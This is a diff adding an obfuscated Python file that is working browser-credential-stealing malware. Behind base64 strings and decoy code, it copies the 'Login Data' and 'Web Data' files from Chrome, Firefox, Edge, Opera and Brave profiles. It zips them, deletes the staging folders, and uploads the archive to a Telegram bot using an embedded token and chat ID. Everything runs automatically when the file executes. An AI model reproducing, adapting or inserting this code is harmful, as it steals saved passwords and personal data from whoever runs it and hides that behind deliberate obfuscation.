@@ -1,0 +1,404 @@
+import base64
+import os
+import shutil
+import string
+import random
+import zipfile
+import requests
+
+Lm3eR7aBpW = "aS2vM8pXwG"
+T7fZpY6cDvQ = "vB8kN6rDlZ"
+H5dQ9jK3zT = "lD6cT3vF9w"
+P1mXvY2rN6 = "dK8sV9iR4j"
+Q6yH8oM2dN = "tJ3bL7mW1r"
+C2vXzY9aBc = "xL4iG3oK6m"
+s6Lm2NnGkE = "RmlyZWZveA=="
+B9vXyK8aT1 = "rD2fE1gJ7b=="
+W6sD7xY2aL = "gP9cT1wK5n="
+F5gM6oL3wV = "aD7vB8kP4i="
+T4iF1yN7wX = "kL6rE3zV8o=="
+G7hN3oP9cT = "rE1fQ2gT5i="
+V8wZ9yK6aB = "pW2sD4vF7i="
+M3nF5bH1jZ = "zT6iK7rQ8w="
+X1oR4qZ8iW = "mF2cH9kD7b=="
+O4kY8xL5aR = "tV9gN1pH6z"
+R7bQk2pT8W = "NjI0MTk1ODI0MQ=="
+I9lU6tG2vQ = "oM4jR8kC5b"
+Z6tV7yQ4gM = "eS1aL3vN9w"
+R3zX5dW6sP = "vY8oK7nH4m"
+A8pE1fW4sC = "LnppcA=="
+D7vT4wZ9yN = "aL8mK6nO3p"
+aVzXhJ4oT1 = "RWRnZQ=="
+K3uX2vY7sQ = "bR4cP9wN5m=="
+C9bG6dO2pA = "zH8qW7xL3k=="
+H4iS5qZ1wB = "wG6yV9lM7n=="
+J7bN8sZ2yD = "yE3aX5uV1p=="
+B6aQ8dH3gJ = "rN7zW4oC9x=="
+MxKtZp9lVq = "QnJhdmU="
+S5dY9qZ6fL = "zH6rP7sX8m="
+H9yTmRbNzD = "Rezistenza"
+Y3rPbQ8dFv = "Q2hyb21l"
+R7wDyUfC5G = "T3BlcmE="
+iOeWu6sHvL = "R29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YQ==="
+ZYjXfK3r2A = "TW96aWxsYVxcRmlyZWZveFxcUHJvZmlsZXM="
+B5VzPq7WxM = "TWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGE="
+c9oNnF1IaT = "T3BlcmEgU29mdHdhcmVcXFN0YWJsZQ=="
+G4UyTb2RkQ = "QnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRh"
+Z9AbC8DdE7 = "VGhpcyBlc3BlY2lhbGx5IG1vZGlmaWNhdGlvbg=="
+X5EfG2HkI3 = "VGhpcyBlbmNvZGluZyBpcyBwcm9kdWN0aW9u"
+U4JpK6L5MqN = "U29ycnksIHdoZW4gdGhpcyBzdHJpbmcgaXM="
+L9O0P8Q6R7S = "UGxhdGZvcm1cXFRoaXMgaXMgd29ya3MgY29sbGVnZQ=="
+H3I4S2T5U0V = "VGhpcyBpcyBhIG51bWJlciBvZiBkZXNrdG9w"
+D4W5X3Y7Z8A = "QnJhdmVTb2Z0d2FyZVxcQnJhdmUtQnJvd3NlclxcVXNlciBEYXRh"
+M5N2O0P1Q8R = "TWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGE="
+F6G7H8I9J0K = "TW96aWxsYVxcRmlyZWZveFxcUHJvZmlsZXM="
+C7D8E3F2G5H = "R29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YQ=="
+V4I5J6K3L2M = "VGhpcyBlc3BlY2lhbGx5IG1vZGlmaWNhdGlvbg=="
+N7O8P5Q6R3S = "VGhpcyBlc3BlY2lhbGx5IHN0YXRlcyBhcmUgYmVsaWVmcyBhcmU="
+W8X9Y6Z3A4B = "VGhpcyBlc3BlY2lhbGx5IHN0YXRlcyBhcmUgYmVsaWVmcyBhcmU="
+M7N8O1P6Q3R = "VGhpcyBlc3BlY2lhbGx5IHdpbGwgc3R1ZmYgc3VwcG9ydA=="
+T2U6V7W8X5Y = "U29ycnksIHdoZW4gdGhpcyBzdHJpbmcgaXM="
+J1K2L3M4N5O = "VGhpcyBlbmNvZGluZyBpcyBwcm9kdWN0aW9u"
+H6I7J8K9L0M = "V2hhdCBpcyB0aGUgc3RyaW5nIG5vdCBkZXNrdG9w"
+T7U8V9W0X1Y = "Q29tcHV0ZXJzIGluIFhNTCB0byBkZWFsIHdpdGggY29tcGxleCB1c2Vy"
+A5sG9rP1zQX = "NjU5MDg5MDg1MTpBQUZ1SUx6NHRQZVJMVUg5VDdZX0lGSG1xOEdwbUxESDBSVQ=="
+A2B3C4D5E6F = "U29ycnksIHdoZW4gdGhpcyBlc3BlY2lhbGx5IGVtYWls"
+P3Q4R5S6T7U = "QW5kIHlvdSBjYW4gdXNlIHRoZSBkYXRhIGluIFhNTCBmb3JtYXQ="
+Z1A2B3C4D5E = "VGhpcyBlbmNvZGluZyBpcyBwcm9kdWN0aW9u"
+W4X5Y6Z7A8B = "VGhpcyBlc3BlY2lhbGx5IG1vZGlmaWNhdGlvbg=="
+K3L4M5N6O7P = "VGhpcyBlc3BlY2lhbGx5IHN0YXRlcyBhcmUgYmVsaWVmcyBhcmU="
+S2T3U4V5W6X = "VGhpcyBlc3BlY2lhbGx5IHN0YXRlcyBhcmUgYmVsaWVmcyBhcmU="
+Q6R7S8T9U0V = "VGhpcyBlc3BlY2lhbGx5IHdpbGwgc3R1ZmYgc3VwcG9ydA=="
+H5I6J7K8L9M = "U29ycnksIHdoZW4gdGhpcyBzdHJpbmcgaXM="
+X4Y5Z6A7B8C = "VGhpcyBlbmNvZGluZyBpcyBwcm9kdWN0aW9u"
+O3P4Q5R6S7T = "VGhpcyBlc3BlY2lhbGx5IG1vZGlmaWNhdGlvbg=="
+M2N3O4P5Q6R = "VGhpcyBlc3BlY2lhbGx5IHN0YXRlcyBhcmUgYmVsaWVmcyBhcmU="
+G4H5I6J7K8L = "VGhpcyBlc3BlY2lhbGx5IHN0YXRlcyBhcmUgYmVsaWVmcyBhcmU="
+J7pKqXrDw2 = [
+    (Y3rPbQ8dFv, iOeWu6sHvL),
+    (s6Lm2NnGkE, ZYjXfK3r2A),
+    (aVzXhJ4oT1, B5VzPq7WxM),
+    (R7wDyUfC5G, c9oNnF1IaT),
+    (MxKtZp9lVq, G4UyTb2RkQ),
+]
+seXsW8yB2g = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+iVfLdPzY3k = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+mXpBvQsI2h = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+vDqSoWnX0e = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+aRvMqGhL7b = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+wVtDcYiP7s = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+oHwAeRzT9i = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+hTmWdZoV8u = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+xGnRzWdQ9o = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+hTmWdZoV8u = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+bLqXyNvI1g = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+yIcGmUwV2j = [
+    (Lm3eR7aBpW, T7fZpY6cDvQ),
+    (H5dQ9jK3zT, P1mXvY2rN6),
+    (Q6yH8oM2dN, C2vXzY9aBc),
+    (B9vXyK8aT1, W6sD7xY2aL),
+    (F5gM6oL3wV, T4iF1yN7wX)
+]
+def C3Q6yH8oM2dN():
+    result = Q6yH8oM2dN + C2vXzY9aBc
+    return result
+def ASD4B9vXyK8aT():
+    result = B9vXyK8aT1 + W6sD7xY2aL
+    return result
+def ASDF5F5gM6oL3w():
+    result = F5gM6oL3wV + T4iF1yN7wX
+    return result
+def Q6G7hN3oP9c():
+    result = G7hN3oP9cT + V8wZ9yK6aB
+    return result
+def RmFFoGW1Wd():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("W9i7lxOqLRbgVaEF").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def GvMEF68IMz():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("xzlBpqavfIH7kY9G").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def jZSBtKTAa2():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("6LsULmkKgPY5KUSA").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def aJyiDArBaE():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("kOQ6WflB6sOE3CTK").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def vYn9pzjYVL():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("wrM1REuJNrCZuQKk").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def T3mNvYkWpC():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("TE9DQUxBUFBEQVRB").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def GT6ZyFcIkg():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("iWisqvlpYkaRRxPM").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def WzSetwYxas():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("MWj4MwdK7ghQ4Sny").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def M1LaCtFzh5():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("HciCVIumQwcirUQc").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def EGW1hHRz27():
+    W4tGzRbQxH = []
+    for A9bRzGpYqW, N5cHjXmZrT in J7pKqXrDw2:
+        E8vMnWzRqA = os.path.join(os.getenv(base64.b64decode("uWAYDFXojcrHJM3X").decode()), base64.b64decode(N5cHjXmZrT).decode())
+        if os.path.exists(E8vMnWzRqA):
+            W4tGzRbQxH.append((base64.b64decode(A9bRzGpYqW).decode(), E8vMnWzRqA))
+    return W4tGzRbQxH
+def e5xJAs4722(S1sKpGzBxV, C7qWnDvXmR):
+    D8fTmZrYjA = f"{S1sKpGzBxV}_D"
+    A2bGmRqYwV = os.path.join(os.getcwd(), D8fTmZrYjA)
+    os.makedirs(A2bGmRqYwV, exist_ok=True)
+    for T5yNzHrJpL in os.listdir(C7qWnDvXmR):
+        F4oVwQxMjK = os.path.join(C7qWnDvXmR, T5yNzHrJpL)
+        W6uRzBqHvD = os.path.join(F4oVwQxMjK, base64.b64decode("LfMhAjxe2BtM").decode())
+        P9lLsXvNcT = os.path.join(F4oVwQxMjK, base64.b64decode("O58RRpxtKN60").decode())
+        if os.path.exists(W6uRzBqHvD):
+            shutil.copy(W6uRzBqHvD, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_L_D"))
+        if os.path.exists(P9lLsXvNcT):
+            shutil.copy(P9lLsXvNcT, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_W_D"))
+def KTJdj7rbhN(S1sKpGzBxV, C7qWnDvXmR):
+    D8fTmZrYjA = f"{S1sKpGzBxV}_D"
+    A2bGmRqYwV = os.path.join(os.getcwd(), D8fTmZrYjA)
+    os.makedirs(A2bGmRqYwV, exist_ok=True)
+    for T5yNzHrJpL in os.listdir(C7qWnDvXmR):
+        F4oVwQxMjK = os.path.join(C7qWnDvXmR, T5yNzHrJpL)
+        W6uRzBqHvD = os.path.join(F4oVwQxMjK, base64.b64decode("zFSElBcNObLZ").decode())
+        P9lLsXvNcT = os.path.join(F4oVwQxMjK, base64.b64decode("RkBll7NelXJV").decode())
+        if os.path.exists(W6uRzBqHvD):
+            shutil.copy(W6uRzBqHvD, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_L_D"))
+        if os.path.exists(P9lLsXvNcT):
+            shutil.copy(P9lLsXvNcT, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_W_D"))
+def VJvm4DQqKU(S1sKpGzBxV, C7qWnDvXmR):
+    D8fTmZrYjA = f"{S1sKpGzBxV}_D"
+    A2bGmRqYwV = os.path.join(os.getcwd(), D8fTmZrYjA)
+    os.makedirs(A2bGmRqYwV, exist_ok=True)
+    for T5yNzHrJpL in os.listdir(C7qWnDvXmR):
+        F4oVwQxMjK = os.path.join(C7qWnDvXmR, T5yNzHrJpL)
+        W6uRzBqHvD = os.path.join(F4oVwQxMjK, base64.b64decode("XblLetiOBz0l").decode())
+        P9lLsXvNcT = os.path.join(F4oVwQxMjK, base64.b64decode("Jkt8fWWrmjYq").decode())
+        if os.path.exists(W6uRzBqHvD):
+            shutil.copy(W6uRzBqHvD, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_L_D"))
+        if os.path.exists(P9lLsXvNcT):
+            shutil.copy(P9lLsXvNcT, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_W_D"))
+def J3xK9yH7zQ():
+    D6tR1vN7pZ = base64.b64decode(A5sG9rP1zQX).decode()
+    W8sX2qK5mL = base64.b64decode(R7bQk2pT8W).decode()
+    script_directory = os.path.dirname(os.path.abspath(__file__))
+    zip_files = [f for f in os.listdir(script_directory) if f.endswith(base64.b64decode(A8pE1fW4sC).decode())]
+    if zip_files:
+        J9lF4aT7eD = os.path.join(script_directory, zip_files[0])
+        H9bV4gF3jD = f"https://api.telegram.org/bot{D6tR1vN7pZ}/sendDocument"
+        T7rU1zP6oY = {base64.b64decode('ZG9jdW1lbnQ=').decode(): open(J9lF4aT7eD, 'rb')}
+        G5kX2sH8pM = {base64.b64decode('Y2hhdF9pZA==').decode(): W8sX2qK5mL}
+        H7pV2zQ9oL = requests.post(H9bV4gF3jD, data=G5kX2sH8pM, files=T7rU1zP6oY)
+    else:
+        exit()
+def K2vLrNpQsW(S1sKpGzBxV, C7qWnDvXmR):
+    D8fTmZrYjA = f"{S1sKpGzBxV}_D"
+    A2bGmRqYwV = os.path.join(os.getcwd(), D8fTmZrYjA)
+    os.makedirs(A2bGmRqYwV, exist_ok=True)
+    for T5yNzHrJpL in os.listdir(C7qWnDvXmR):
+        F4oVwQxMjK = os.path.join(C7qWnDvXmR, T5yNzHrJpL)
+        W6uRzBqHvD = os.path.join(F4oVwQxMjK, base64.b64decode("TG9naW4gRGF0YQ==").decode())
+        P9lLsXvNcT = os.path.join(F4oVwQxMjK, base64.b64decode("V2ViIERhdGE=").decode())
+        if os.path.exists(W6uRzBqHvD):
+            shutil.copy(W6uRzBqHvD, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_L_D"))
+        if os.path.exists(P9lLsXvNcT):
+            shutil.copy(P9lLsXvNcT, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_W_D"))
+def vymv7vDZqM(S1sKpGzBxV, C7qWnDvXmR):
+    D8fTmZrYjA = f"{S1sKpGzBxV}_D"
+    A2bGmRqYwV = os.path.join(os.getcwd(), D8fTmZrYjA)
+    os.makedirs(A2bGmRqYwV, exist_ok=True)
+    for T5yNzHrJpL in os.listdir(C7qWnDvXmR):
+        F4oVwQxMjK = os.path.join(C7qWnDvXmR, T5yNzHrJpL)
+        W6uRzBqHvD = os.path.join(F4oVwQxMjK, base64.b64decode("ccoFQzetZakH").decode())
+        P9lLsXvNcT = os.path.join(F4oVwQxMjK, base64.b64decode("ji0DAzXjWVUg").decode())
+        if os.path.exists(W6uRzBqHvD):
+            shutil.copy(W6uRzBqHvD, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_L_D"))
+        if os.path.exists(P9lLsXvNcT):
+            shutil.copy(P9lLsXvNcT, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_W_D"))
+def xUF5Oy5lun(S1sKpGzBxV, C7qWnDvXmR):
+    D8fTmZrYjA = f"{S1sKpGzBxV}_D"
+    A2bGmRqYwV = os.path.join(os.getcwd(), D8fTmZrYjA)
+    os.makedirs(A2bGmRqYwV, exist_ok=True)
+    for T5yNzHrJpL in os.listdir(C7qWnDvXmR):
+        F4oVwQxMjK = os.path.join(C7qWnDvXmR, T5yNzHrJpL)
+        W6uRzBqHvD = os.path.join(F4oVwQxMjK, base64.b64decode("P1QK9pZebywn").decode())
+        P9lLsXvNcT = os.path.join(F4oVwQxMjK, base64.b64decode("Tjhh1kGUV8R9").decode())
+        if os.path.exists(W6uRzBqHvD):
+            shutil.copy(W6uRzBqHvD, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_L_D"))
+        if os.path.exists(P9lLsXvNcT):
+            shutil.copy(P9lLsXvNcT, os.path.join(A2bGmRqYwV, f"{T5yNzHrJpL}_W_D"))
+def M3kZrTjHvP():
+    Q1sMjKtZrT = T3mNvYkWpC()
+    for J8hPvZmRwX, X2yNcTzHrG in Q1sMjKtZrT:
+        K2vLrNpQsW(J8hPvZmRwX, X2yNcTzHrG)
+def Q1aVzXhJ4oT():
+    result = Lm3eR7aBpW + T7fZpY6cDvQ
+    return result
+def B2R7wDyUfC5G():
+    result = H5dQ9jK3zT + P1mXvY2rN6
+    return result
+def C3Q6yH8oM2dN():
+    result = Q6yH8oM2dN + C2vXzY9aBc
+    return result
+def ASD4B9vXyK8aT():
+    result = B9vXyK8aT1 + W6sD7xY2aL
+    return result
+def ASDF5F5gM6oL3w():
+    result = F5gM6oL3wV + T4iF1yN7wX
+    return result
+def Q6G7hN3oP9c():
+    result = G7hN3oP9cT + V8wZ9yK6aB
+    return result
+def B7M3nF5bH1j():
+    result = M3nF5bH1jZ + X1oR4qZ8iW
+    return result
+def C8O4kY8xL5a():
+    result = O4kY8xL5aR + I9lU6tG2vQ
+    return result
+def ASD9Z6tV7yQ4g():
+    result = Z6tV7yQ4gM + R3zX5dW6sP
+    return result
+def ASDF10H4iS5qZ1w():
+    result = H4iS5qZ1wB + J7bN8sZ2yD
+    return result
+def uVwXyZaBcD(length):
+    HiJkLmNoP = string.ascii_letters + string.digits
+    return ''.join(random.choice(HiJkLmNoP) for _ in range(length))
+def LmNoPqRsTu():
+    data_folders = [folder for folder in os.listdir() if os.path.isdir(folder)]
+    zip_filename = uVwXyZaBcD(10) + ".zip"
+    password = H9yTmRbNzD
+    with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zipf:
+        for folder in data_folders:
+            for root, _, files in os.walk(folder):
+                for file in files:
+                    zipf.write(
+                        os.path.join(root, file),
+                        os.path.relpath(os.path.join(root, file), os.path.dirname(folder))
+                    )
+    zipf.setpassword(password.encode())
+    for folder in data_folders:
+        shutil.rmtree(folder)
+Q1aVzXhJ4oT()
+B2R7wDyUfC5G()
+C3Q6yH8oM2dN()
+ASD4B9vXyK8aT()
+ASDF5F5gM6oL3w()
+M3kZrTjHvP()
+Q6G7hN3oP9c()
+B7M3nF5bH1j()
+LmNoPqRsTu()
+C8O4kY8xL5a()
+ASD9Z6tV7yQ4g()
+ASDF10H4iS5qZ1w()
+C3Q6yH8oM2dN()
+ASD4B9vXyK8aT()
+J3xK9yH7zQ()
+ASDF5F5gM6oL3w()
+Q6G7hN3oP9c()
+
